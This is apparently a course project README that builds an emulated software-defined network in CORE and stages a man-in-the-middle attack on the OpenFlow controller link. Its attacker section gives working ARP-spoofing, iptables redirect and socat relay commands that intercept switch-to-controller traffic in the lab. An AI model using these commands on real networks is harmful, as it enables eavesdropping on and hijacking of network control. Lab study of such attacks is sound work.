# ENPM693-final-project
# Man-in-the-Middle Attacks on the Southbound Interface in Software-Defined Networks

### Installing necessary tools
```
sudo apt update; sudo apt -y upgrade
sudo apt -y install git net-tools wireshark tshark iperf3
```

### Installing CORE network emulator
```
git clone https://github.com/coreemu/core.git
cd core
./setup.sh
inv install

# update PATH
export PATH=$PATH:/opt/core/venv/bin:/home/ubuntu/.local/bin

# running CORE
# 1st terminal - starting core-daemon
sudo env PATH=$PATH core-daemon

# 2nd terminal - starting core-gui
core-gui 
```

Next step is to import `sdn.xml` to emulator and start it.

Then run the following commands for mentioned devices.

### controller
```
ryu-manager --ofp-tcp-listen-port 6633 controller.py 
```

### switches
```
chmod +x init_ovs.sh
./init_ovs.sh 10.0.8.10
```

### attacker
```
sudo sysctl -w net.ipv4.ip_forward=1

sudo sysctl -w net.ipv4.conf.all.send_redirects=0


for ip in 10.0.8.1 10.0.8.2 10.0.8.3; do
  sudo arpspoof -i eth0 -t "$ip" 10.0.8.10 &
  sudo arpspoof -i eth0 -t 10.0.8.10 "$ip" &
done

# forward any TCP destined to 10.0.8.10:6633 into local port 6633
sudo iptables -t nat -A PREROUTING -p tcp --dport 6633 \
       -d 10.0.8.10 -j REDIRECT --to-ports 6633

# starting relay
# Listen locally on 0.0.0.0:6633  and forward to the controller 10.0.8.10:6633
sudo socat -v TCP-LISTEN:6633,reuseaddr,fork TCP:10.0.8.10:6633

wireshark
```

![](simulation.gif)
